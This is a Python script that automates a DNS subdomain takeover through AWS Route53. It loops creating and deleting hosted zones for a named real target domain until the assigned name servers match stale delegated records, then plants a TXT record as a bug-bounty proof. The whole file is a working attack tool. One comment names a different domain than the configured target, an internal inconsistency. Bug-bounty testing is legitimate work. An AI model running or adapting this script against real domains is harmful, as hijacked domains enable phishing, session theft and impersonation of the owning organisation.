import boto3
import time
import random
import string

# =============================================================================
# CONFIGURATION — edit everything here before running
# =============================================================================

# AWS credentials
AWS_ACCESS_KEY = ""
AWS_SECRET_KEY = ""
REGION         = "us-east-1"

# Target
TARGET_DOMAIN  = "satori.anduril.dev"

# Stale NS records currently delegated for the target domain.
# These were observed via `dig NS api.dailymotion.com` — must match exactly.
TARGET_NAME_SERVERS = [
    "ns-550.awsdns-04.net.", "ns-1790.awsdns-31.co.uk.", "ns-1040.awsdns-02.org."
]

# POC — TXT record added automatically on successful takeover
POC_TXT_VALUE = "Bugbounty - DNS takeover POC by Rizin"
POC_TXT_TTL   = 60

# Tuning
SLEEP_BETWEEN_ATTEMPTS = 1   # seconds between create/delete cycles; raise if throttled
MAX_ATTEMPTS           = 2500   # 0 = run forever until match or fatal error

# =============================================================================

client = boto3.client(
    'route53',
    aws_access_key_id=AWS_ACCESS_KEY,
    aws_secret_access_key=AWS_SECRET_KEY,
    region_name=REGION
)


def get_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def add_txt_record(zone_id: str) -> None:
    try:
        client.change_resource_record_sets(
            HostedZoneId=zone_id,
            ChangeBatch={
                "Comment": "Bug bounty DNS takeover POC",
                "Changes": [
                    {
                        "Action": "CREATE",
                        "ResourceRecordSet": {
                            "Name": TARGET_DOMAIN,
                            "Type": "TXT",
                            "TTL":  POC_TXT_TTL,
                            "ResourceRecords": [
                                {"Value": f'"{POC_TXT_VALUE}"'}
                            ],
                        },
                    }
                ],
            },
        )
        print(f"[+] TXT record added: \"{POC_TXT_VALUE}\"")
        print(f"[+] Verify with: dig TXT {TARGET_DOMAIN} @{list(TARGET_NAME_SERVERS)[0]}")
        print(f"[!] ZONE KEPT. Screenshot and report — then delete the zone when done.")
    except Exception as e:
        print(f"[!] Failed to add TXT record: {e}")
        print(f"[!] Zone {zone_id} is still live — add the record manually via AWS Console.")


def attempt_takeover():
    attempts = 0
    print(f"[*] Starting NS lottery for {TARGET_DOMAIN}")
    print(f"[*] Target NS:     {TARGET_NAME_SERVERS}")
    print(f"[*] Max attempts:  {'unlimited' if MAX_ATTEMPTS == 0 else MAX_ATTEMPTS}\n")

    while True:
        if MAX_ATTEMPTS and attempts >= MAX_ATTEMPTS:
            print(f"[!] Reached MAX_ATTEMPTS ({MAX_ATTEMPTS}). Stopping.")
            break
        attempts += 1
        caller_ref = f"takeover-{get_random_string()}"

        try:
            response = client.create_hosted_zone(
                Name=TARGET_DOMAIN,
                CallerReference=caller_ref
            )

            tested_name = response['HostedZone']['Name']
            print("----NAME----\n\n")
            print(f"Name: {tested_name}\n")

            zone_id = response['HostedZone']['Id']
            assigned_ns = [ns + "." if not ns.endswith(".") else ns for ns in response['DelegationSet']['NameServers']]

            print(f"--- Attempt #{attempts} ---")
            print(f"ID: {zone_id}")
            print(f"Assigned NS: {assigned_ns}")

            matches = set(assigned_ns).intersection(set(TARGET_NAME_SERVERS))

            if matches:
                print(f"\n[!!!] MATCH FOUND!")
                print(f"[+] Matched Name Servers: {list(matches)}")
                print(f"[+] Zone ID: {zone_id}")
                print(f"[*] Adding POC TXT record...")
                add_txt_record(zone_id)
                break
            else:
                print(f"[-] No match. Cleaning up...")
                client.delete_hosted_zone(Id=zone_id)
                print(f"[*] Sleeping {SLEEP_BETWEEN_ATTEMPTS}s before next attempt...\n")
                time.sleep(SLEEP_BETWEEN_ATTEMPTS)

        except client.exceptions.TooManyHostedZones:
            print("[!] FATAL: AWS account limit reached. Delete old zones manually.")
            break
        except Exception as e:
            error_msg = str(e)
            if "Throttling" in error_msg or "Rate exceeded" in error_msg:
                print("[!] AWS Rate Limit hit. Backing off for 30 seconds...")
                time.sleep(30)
            else:
                print(f"[!] Error occurred: {error_msg}")
                time.sleep(10)


if __name__ == "__main__":
    attempt_takeover()